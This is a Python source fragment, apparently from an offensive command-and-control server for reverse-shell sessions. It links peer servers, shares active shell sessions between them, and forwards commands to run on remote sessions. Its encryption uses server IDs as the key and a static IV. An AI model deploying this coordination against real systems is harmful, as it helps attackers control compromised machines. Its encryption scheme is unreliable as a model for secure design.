		current_shells = Sessions_manager.active_sessions.keys()
		
		for session_id in shells_data.keys():
			if session_id not in current_shells:
				Sessions_manager.active_sessions[session_id] = shells_data[session_id]
						


	def server_is_sibling(self, server_ip, server_port = False): #, server_port
		
		sibling_id = None
		
		for sibling in self.sibling_servers.keys():
			
			if server_port:
				if self.sibling_servers[sibling]['Server IP'] == server_ip and self.sibling_servers[sibling]['Server Port'] == int(server_port):
					sibling_id = sibling
					break
					
			else:
				if self.sibling_servers[sibling]['Server IP'] == server_ip:
					sibling_id = sibling
					break				
		
		return sibling_id



	# ~ def share_sibling_servers_info(self, sibling_id):
		
		# ~ # AES KEY is the server's ID and IV is the 16 first bytes of the sibling's ID
		# ~ sibling_servers_data_local = str(self.encapsulate_dict(self.sibling_servers, 'synchronize_sibling_servers_table'))
		# ~ sibling_servers_data_local_encrypted = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_data_local, sibling_id[0:16].encode('utf-8'))
		# ~ sibling_servers_data_remote_encrypted = self.send_receive_one(sibling_servers_data_local_encrypted, self.sibling_servers[sibling_id]['Server IP'], self.sibling_servers[sibling_id]['Server Port'], encode_msg = False)
		# ~ sibling_servers_data_remote_decrypted = decrypt_msg(sibling_id.encode('utf-8'), sibling_servers_data_remote_encrypted, self.SERVER_UNIQUE_ID[0:16].encode('utf-8'))
		# ~ decapsulated = self.decapsulate_dict(sibling_servers_data_remote_decrypted) # returns [capsule, received_data]
		# ~ self.update_siblings_data_table(decapsulated[1])


	@staticmethod
	def send_receive_one_encrypted(sibling_id, data_dict, capsule):
		
		#print(f'send-rcv-one-enc: {sibling_id}, {data_dict}, {capsule}')
		
		# AES KEY is the server's ID and IV is the 16 first bytes of the sibling's ID
		server_unique_id = Core_server.return_server_uniq_id()
		encapsulated_data = str(Core_server.encapsulate_dict(data_dict, capsule))
		encapsulated_data_encrypted = encrypt_msg(server_unique_id.encode('utf-8'), encapsulated_data, sibling_id[0:16].encode('utf-8'))
		encapsulated_response_data_encrypted = Core_server.send_receive_one(encapsulated_data_encrypted, Core_server.sibling_servers[sibling_id]['Server IP'], Core_server.sibling_servers[sibling_id]['Server Port'], encode_msg = False)		
		#print(f'Received-send-rcv-one-enc: {encapsulated_response_data_decrypted}')
		
		if encapsulated_response_data_encrypted not in ['connection_refused', 'timed_out']:
			encapsulated_response_data_decrypted = decrypt_msg(sibling_id.encode('utf-8'), encapsulated_response_data_encrypted, server_unique_id[0:16].encode('utf-8'))
			decapsulated_response_data = Core_server.decapsulate_dict(encapsulated_response_data_decrypted) # returns [capsule, received_data]
			return decapsulated_response_data
		
		else:
			return encapsulated_response_data_encrypted
		
		

	def synchronize_sibling_servers(self):
		
		print('\rSynchronizing servers...')
		
		for sibling_id in self.sibling_servers.keys():
			
			#print(f'Synching with {sibling_id}')
			# Sync sibling servers table
			#print(f'sending {self.sibling_servers}')
			remote_siblings_data = Core_server.send_receive_one_encrypted(sibling_id, self.sibling_servers, 'synchronize_sibling_servers_table')
			#print(f' received: {remote_siblings_data[1]}')
			self.update_siblings_data_table(remote_siblings_data[1])
			
			# Sync sibling servers shell sessions
			remote_shells = Core_server.send_receive_one_encrypted(sibling_id, Sessions_manager.active_sessions, 'synchronize_sibling_servers_shells')
			self.update_shell_sessions(remote_shells[1])			

			if not self.ping_sibling_servers:
				siblings_status_monitor = Thread(target = self.ping_siblings, args = ())
				siblings_status_monitor.daemon = True
				siblings_status_monitor.start()	
			
		print('\rSynchronized!')
		Main_prompt.rst_prompt(force_rst = True, prompt = '\r')



	def connect_with_sibling_server(self, server_ip, server_port):
		
		# Check if valid port
		server_port = int(server_port)
		authorized = True

		if not is_valid_ip(server_ip):
			print('\rProvided IP address is not valid.')
			authorized = False				
		
		if server_port < 0 or server_port > 65535:
			print('\rPort must be 0-65535.')
			authorized = False					
		
		# Check if attempt to connect to self
		if (server_port == self.bind_port) and (server_ip in ['127.0.0.1', 'localhost']):
			print('\rIf you really want to connect with yourself, try yoga.')
			authorized = False						
		
		# Check if server_ip already in siblings
		server_is_sibling = self.server_is_sibling(server_ip, server_port)
		
		if server_is_sibling:
			print('\rYou are already connected with this server.')
			authorized = False			
			
			
		# Init connect
		if authorized:
			
			response = self.send_receive_one(self.CONNECT_SYN, server_ip, server_port, encode_msg = False)
			
			if response == 'connection_refused':
				return print(f'\r[{FAILED}] Connection refused.')
				
			elif response == 'timed_out':
				return print(f'\r[{FAILED}] Connection timed out.')

			elif response == self.CONNECT_ACK:
				response = self.send_receive_one(f'{self.SERVER_UNIQUE_ID}:{self.bind_port}:{self.HOSTNAME}', server_ip, server_port, encode_msg = True)
				tmp = response.decode('utf-8').split(':')
				sibling_id = tmp[0]
				sibling_hostname = tmp[1]

				if is_valid_uuid(sibling_id):
					self.sibling_servers[sibling_id] = {'Hostname': sibling_hostname, 'Server IP' : server_ip, 'Server Port' : server_port, 'Status' : f'{GREEN}Active{END}'}
						
				else:
					return print('Connection request failed.')
						
				print('\rConnection established!\r')
				
				if not self.ping_sibling_servers:
					siblings_status_monitor = Thread(target = self.ping_siblings, args = ())
					siblings_status_monitor.daemon = True
					siblings_status_monitor.start()				
				
		Main_prompt.set_main_prompt_ready()
		

		
	def proxy_cmd_for_exec_by_sibling(self, sibling_id, session_id, command):
		
		# Check again if server in siblings
		if not sibling_id in self.sibling_servers.keys():
			print('\rServer not in siblings.')
			return
		
		# Send command to sibling
		cmd_exec_data = {'session_id' : session_id, 'command' : command}
		response = self.send_receive_one_encrypted(sibling_id, cmd_exec_data, 'exec_command')
		
		# Read response
		if response[0] == 'ACKNOWLEDGED':
			print('Command delivered. Awaiting output...')
		
		

	def ping_siblings(self):

		self.ping_sibling_servers = True
		
		while True:
			
			siblings = self.sibling_servers.keys()
			
			if not len(siblings):
				Core_server.ping_siblings = False
				break
			
			else:
				
				for sibling_id in siblings:
					
					response = Core_server.send_receive_one_encrypted(sibling_id, {0 : 0}, 'are_you_alive')
					self.sibling_servers[sibling_id]['Status'] = f'Unreachable' if response in ['connection_refused', 'timed_out'] else f'Active'				
			
			sleep(5)



	def siblings_dict_to_list(self):
		
		siblings_list = []
		
		for sibling_id in self.sibling_servers.keys():
			
			tmp = self.sibling_servers[sibling_id]
			tmp['Sibling ID'] = sibling_id
			siblings_list.append(tmp)
		
		return siblings_list
